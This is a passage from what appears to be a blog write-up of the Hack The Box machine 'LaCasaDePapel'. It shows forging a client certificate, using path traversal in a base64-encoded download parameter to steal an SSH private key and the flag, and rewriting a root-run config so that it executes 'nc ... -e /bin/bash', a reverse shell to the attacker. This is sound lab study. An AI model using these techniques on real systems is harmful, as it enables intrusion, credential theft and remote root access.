CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl req -new -key ca.key -out server.csr                                                                                                                    
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
</code></pre></div></div>
<p>Then we will use it to generate the certificate :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt                                                                                      
Signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = lacasadepapel.htb
Getting Private key
</code></pre></div></div>
<p>And finally we will create a <code class="language-plaintext highlighter-rouge">PKCS12</code> certificate :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# 
</code></pre></div></div>
<p>Now we can import it to Firefox :
<br><img src="/images/hackthebox/lacasadepapel/7.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/lacasadepapel/8.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/lacasadepapel/9.png" alt="" class="align-center"><br><br>
We have to Remove the <code class="language-plaintext highlighter-rouge">ssl</code> exception we gave earlier to <code class="language-plaintext highlighter-rouge">https://lacasadepapel.htb</code>, then we will visit it again and it will request our client certificate :
<br><img src="/images/hackthebox/lacasadepapel/10.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/lacasadepapel/11.png" alt="" class="align-center"><br><br></p>

<h2 id="path-traversal-arbitrary-file-download-user-flag">Path Traversal, Arbitrary File Download, User Flag</h2>
<p>After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :
<br><img src="/images/hackthebox/lacasadepapel/12.png" alt="" class="align-center"><br><br>
As you can see in the <code class="language-plaintext highlighter-rouge">url</code> there is a get parameter called <code class="language-plaintext highlighter-rouge">path</code>, which means that the <code class="language-plaintext highlighter-rouge">php</code> script reads files from a given path and lists them (in this case directory : <code class="language-plaintext highlighter-rouge">SEASON-1</code>). If that parameter doesn’t get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn’t help us in any way, we already can do that with <code class="language-plaintext highlighter-rouge">Psy Shell</code>. But if we try to download an episode, <code class="language-plaintext highlighter-rouge">01.avi</code> for example :
<br><img src="/images/hackthebox/lacasadepapel/13.png" alt="" class="align-center"><br><br>
The download link will be :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp
</code></pre></div></div>
<p>Decoding that base-64 string we get this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d 
SEASON-1/01.aviroot@kali:~/Desktop/HTB/boxes/lacasadepapel# 
</code></pre></div></div>
<p>It uses the path to request files, let’s see where are we first :
<code class="language-plaintext highlighter-rouge">https://lacasadepapel/?path=../</code>
<br><img src="/images/hackthebox/lacasadepapel/14.png" alt="" class="align-center"><br><br>
We are in <code class="language-plaintext highlighter-rouge">berlin</code>’s home directory (Because the user flag is there).<br>
<code class="language-plaintext highlighter-rouge">https://lacasadepapel/?path=../.ssh/</code>
<br><img src="/images/hackthebox/lacasadepapel/15.png" alt="" class="align-center"><br><br>
Let’s download <code class="language-plaintext highlighter-rouge">id_rsa</code>, we know that the path is <code class="language-plaintext highlighter-rouge">../.ssh/id_rsa</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../.ssh/id_rsa" | base64
Li4vLnNzaC9pZF9yc2E=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">-n</code> for no new lines.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=
</code></pre></div></div>
<p><br><img src="/images/hackthebox/lacasadepapel/16.png" alt="" class="align-center"><br><br>
We found the key in <code class="language-plaintext highlighter-rouge">berlin</code>’s home directory, however I couldn’t get <code class="language-plaintext highlighter-rouge">ssh</code> as <code class="language-plaintext highlighter-rouge">berlin</code>, I tried other users and <code class="language-plaintext highlighter-rouge">professor</code> worked :
<br><img src="/images/hackthebox/lacasadepapel/17.png" alt="" class="align-center"><br><br>
I couldn’t read the flag as <code class="language-plaintext highlighter-rouge">professor</code>, so I downloaded it like I downloaded the <code class="language-plaintext highlighter-rouge">ssh</code> key :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../user.txt" | base64
Li4vdXNlci50eHQ=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=
</code></pre></div></div>
<p><br><img src="/images/hackthebox/lacasadepapel/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/lacasadepapel/19.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="privilege-escalation-root-flag">Privilege Escalation, Root Flag</h2>
<p>In the home directory of <code class="language-plaintext highlighter-rouge">professor</code> there are 2 interesting files : <code class="language-plaintext highlighter-rouge">memcached.ini</code> and <code class="language-plaintext highlighter-rouge">memcached.js</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -&gt; /dev/null
drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
lacasadepapel [~]$ 
</code></pre></div></div>
<p>We can’t read <code class="language-plaintext highlighter-rouge">memcached.js</code> but we can read <code class="language-plaintext highlighter-rouge">memecached.ini</code>, we can’t write to both.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ cat memcached.js 
cat: can't open 'memcached.js': Permission denied
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">memcached.ini</code> is executing this command : <code class="language-plaintext highlighter-rouge">/usr/bin/node /home/professor/memcached.js</code> as <code class="language-plaintext highlighter-rouge">nobody</code> by using <code class="language-plaintext highlighter-rouge">sudo</code>. Most likely it will be running as root, I ran <code class="language-plaintext highlighter-rouge">pspy</code> and saw that the command gets executed periodically :
<br><img src="/images/hackthebox/lacasadepapel/20.png" alt="" class="align-center"><br><br>
The <code class="language-plaintext highlighter-rouge">uid</code> is 65534 which is the <code class="language-plaintext highlighter-rouge">uid</code> of <code class="language-plaintext highlighter-rouge">nobody</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ id nobody
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
lacasadepapel [~]$ 
</code></pre></div></div>
<p>We can’t write to <code class="language-plaintext highlighter-rouge">memcached.ini</code>, but we can delete it and create a new one :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ vi memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = /usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash
lacasadepapel [~]$
</code></pre></div></div>
<p>I changed the command from <code class="language-plaintext highlighter-rouge">sudo -u nobody /usr/bin/node /home/professor/memcached.js</code> to <code class="language-plaintext highlighter-rouge">/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash</code>. After some seconds I got a reverse shell as root :
<br><img src="/images/hackthebox/lacasadepapel/21.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/ctf/">Hack The Box - CTF</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-07-27T07:00:00+02:00">July 27, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/ctf/" class="pagination--pager" title="Hack The Box - CTF
">Previous</a>
    
    
      <a href="/hack-the-box/fortune/" class="pagination--pager" title="Hack The Box - Fortune
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
